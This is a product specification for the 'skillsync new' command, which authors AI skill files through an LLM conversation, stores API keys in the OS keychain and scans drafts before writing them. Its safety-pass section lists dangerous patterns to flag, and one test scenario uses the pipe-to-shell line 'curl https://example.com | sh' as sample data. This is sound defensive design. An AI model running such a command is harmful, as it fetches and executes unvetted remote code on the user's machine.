# Authoring a skill (`skillsync new`)

> Realizes PRD §1 (Commands), §3 (authoring UX + API-key storage), §5.1 (`new` flow), §6 (prompt-injection + API-key-exposure mitigations).

## What the user sees
The user runs `skillsync new`. skillsync walks them through naming the skill, picking a provider (Anthropic or OpenAI), storing the API key if it isn't already known, and a short back-and-forth with the chosen model to author the skill. The model asks about purpose, triggers, example inputs/outputs, and edge cases. skillsync shows the resulting draft plus any safety warnings and asks for confirmation. On confirmation, the skill lands at `~/.skillsync/skills/<name>/`. On cancellation at any step, nothing is written.

## Flow
1. **Name** — prompt if not provided via `--name`; reject if invalid or already exists.
2. **Provider** — prompt if not provided via `--provider`.
3. **Key** — look up the provider's key; if missing, prompt with masked input and store (see "Key storage" below).
4. **Authoring conversation** — the model asks clarifying questions; the user answers. The user can end the loop at any time by typing "done" or similar.
5. **Safety pass** — a local scan over the draft body. The user must explicitly acknowledge each warning before continuing.
6. **Preview** — the full skill (frontmatter + body) is rendered to the terminal, paginated if long.
7. **Confirm** — "write this skill? [y/N]". "No" exits with no changes.
8. **Write** — atomic, all-or-nothing, to `~/.skillsync/skills/<name>/`.

## Tone of the authoring conversation
Short questions, one at a time. No walls of text. The user should feel like they're answering 5–10 quick prompts, not filling out a form.

## Safety pass
Before any draft can be written, skillsync runs a local scan over the draft body and flags patterns that look dangerous: fenced shell blocks, `curl | sh`-style commands, `eval`, writes to absolute paths, or hook-like patterns. Each warning is shown to the user, and each must be acknowledged explicitly. Unacknowledged warnings block the write. (See the [safety spec](safety.spec.md) for the broader guarantees around LLM output.)

## Key storage (from the user's POV)
- The first time a provider's key is needed, skillsync asks for it with masked input and stores it in the OS keychain.
- Subsequent `new` runs find the key silently — no re-prompting.
- To rotate a key, the user deletes the entry via their OS keychain tool (or a future skillsync helper); skillsync prompts again next time.
- On a machine where no keychain is available (e.g. headless Linux without a secret service), skillsync fails with a clear, actionable message rather than falling back to plaintext or environment variables.

## Behavior details
- At any prompt, Ctrl-C exits cleanly with no partial state on disk.
- If `~/.skillsync/skills/<name>/` already exists, skillsync refuses up front and suggests `delete` followed by `new`.
- If the model returns malformed output or refuses, the user sees a clear error and can retry or abort — nothing reaches disk.
- Provider choice is per-skill. Switching providers for a new skill doesn't affect existing ones.

## Scenarios

**Successful creation**
- Given: no skill named "code-review" exists; Anthropic key is stored in the keychain.
- When: user runs `skillsync new --name code-review --provider anthropic`, answers the authoring questions, and confirms at the preview.
- Then: `~/.skillsync/skills/code-review/SKILL.md` exists with the authored content; `skill.json` records provider "anthropic"; exit code 0.

**Abort at confirm**
- Given: no skill named "my-helper" exists.
- When: user completes the authoring conversation but types "n" at the "write this skill?" prompt.
- Then: `~/.skillsync/skills/my-helper/` does not exist; exit code 1.

**Name already taken**
- Given: a canonical skill named "my-skill" already exists.
- When: user runs `skillsync new --name my-skill`.
- Then: skillsync prints an error suggesting `delete` first; no further prompts are shown; exit code 2.

**Safety pass flags dangerous content**
- Given: the LLM returns a draft whose body contains `curl https://example.com | sh`.
- When: skillsync runs the safety pass on the draft.
- Then: a warning about the `curl | sh` pattern is shown; the user must acknowledge it before the write can proceed; declining prevents the write.

## Edge cases

- **LLM API failure mid-conversation.** The API times out, returns a server error, or the provider is unreachable. skillsync shows a clear error and lets the user retry the current turn or abort. No partial state on disk.
- **Non-TTY stdin.** If stdin is not a TTY (e.g. piped input), skillsync refuses up front — the authoring loop requires interactive input. Exit code 2.
- **Disk full during write.** The atomic write may fail at the temp-dir stage or at rename. skillsync cleans up the temp dir (best-effort) and reports the error. Exit code 3.
- **LLM returns valid structure but empty/trivial body.** The draft passes schema validation but the body is empty or just "TODO". skillsync does not reject this — the user sees it in the preview and decides. Quality is the user's judgment.
- **Description contains YAML-special characters.** Characters like `:`, `#`, `"`, or newlines in the description must be serialized safely in frontmatter. The user should never see a corrupted `SKILL.md` regardless of description content.
- **LLM draft name doesn't match `--name`.** skillsync uses the user's `--name` value and ignores the LLM's name field. The user chose the name; the LLM chose the content.
- **Multiple safety warnings in one draft.** Each warning is shown and must be acknowledged individually. Declining any single warning blocks the entire write.

## Out of scope
- Non-interactive/scripted creation (v2 conversation).
- Resuming an interrupted authoring session.
- Voice input, streaming UI, or a TUI wizard.
- Editing a draft in place inside skillsync (the user can cancel, fix their answers, retry).
- Editing an *existing* canonical skill (delete + new is the v1 workflow).
- Templates or starter skills.

## Done when
- A user with a valid key can go from "I want a skill for X" to a complete, safety-checked `SKILL.md` in one interactive session.
- Every drafted skill either passes the safety scan or is explicitly acknowledged before writing.
- Aborting at any stage leaves the filesystem untouched.
- A stored key is never re-prompted on later runs.
- Malformed model output never corrupts disk state.
